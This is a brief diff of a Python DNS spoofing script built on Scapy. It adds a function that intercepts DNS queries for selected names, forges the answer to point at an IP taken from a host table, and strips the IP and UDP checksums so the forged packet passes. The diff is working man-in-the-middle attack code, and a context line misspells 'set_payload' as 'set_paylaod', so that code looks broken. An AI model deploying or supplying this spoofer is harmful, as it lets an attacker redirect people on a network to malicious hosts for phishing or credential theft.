@@ -26,3 +26,22 @@ def process_packet(packet):
         packet.set_paylaod(bytes(scapy_packet))
     
     packet.accept()
+
+def modify_packet(packet):
+    qname=packet[DNSQR].qname
+
+    if qname not in dns_hosts:
+        print("no modification:",qname)
+        return packet
+    
+    packet[DNS].an = DNSRR(rrname=qname,rdata=dns_hosts[qname])
+    packet[DNS].ancount=1
+
+    #del the checksums and length of packet 
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+
+    return packet
+    
